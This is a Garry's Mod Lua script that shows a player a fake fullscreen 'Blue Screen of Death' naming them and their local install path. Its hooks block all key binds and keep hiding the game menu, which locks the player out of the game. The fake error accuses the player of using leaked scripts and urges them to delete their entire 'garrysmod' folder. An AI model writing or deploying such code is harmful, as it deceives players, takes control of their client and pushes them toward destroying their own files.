local HTML = [[
<html>
<head>
	<title>BSoD</title>
</head>
<body bgcolor="#000088" scroll="no">
	<font face="Lucida Console" size="3" color="#FFFFFF">
	<p>A problem has been detected and Lua has been shutdown to prevent damage to your carpet.</p>
	
	<p>The problem seems to be caused by the following player: %s</p>
	
	<p>SERVER_USE_LEAKED_SCRIPTS</p>
	<br>
	
	<p>If this is the first time you've seen this stop error screen, restart your GMod. If this screen appears again, follow these steps:</p>
	
	<p>Check to make sure you're not running any cheats or hacks. This includes even having the files. If this is a new installation, disable or remove any newly installed addons.</p> 
	
	<p>If problems continue, clean your GMod by deleting the "garrysmod" folder at "%s", then rejoin. Steam will download a fresh copy.</p> 
	
	<p>Technical information:</p> 
	
	<p>*** STOP: 0x0000541D (0x0000000C,0x00000002,0x00000000,0xF86B5A89)</p> 
	<p>***       %s - Address %s base at ILuaBase, DateStamp %s</p>
	<br>
	
	<p>Beginning dump of physical trousers..</p> 
	<p>Dump complete.</p> 
	<p>Contact microsoft.com for further assistance.</p> 
	
	</font> 
</body>
</html>
]]


BSoD_BD = true

	HTML = Format(HTML,
		LocalPlayer():Nick(),
		util.RelativePathToFull("gameinfo.txt"):gsub("gameinfo.txt",""):Trim("\\"),
		LocalPlayer():SteamID(),
		tostring( LocalPlayer().SteamID ),
		os.time()
	)
	
	BSoD_BD = vgui.Create("HTML")
		BSoD_BD:SetPos(0,0)
		BSoD_BD:SetSize( ScrW(), ScrH() )
	BSoD_BD:SetHTML(HTML)


local function BSoDBinds(ply,cmd,down)
	if BSoD_BD then return true end
end
hook.Add("PlayerBindPress", "BSoDBinds", BSoDBinds)

local function BSoDThink()
	if BSoD_BD then gui.HideGameUI() end
end
hook.Add("PreDrawHUD", "BSoDThink", BSoDThink)
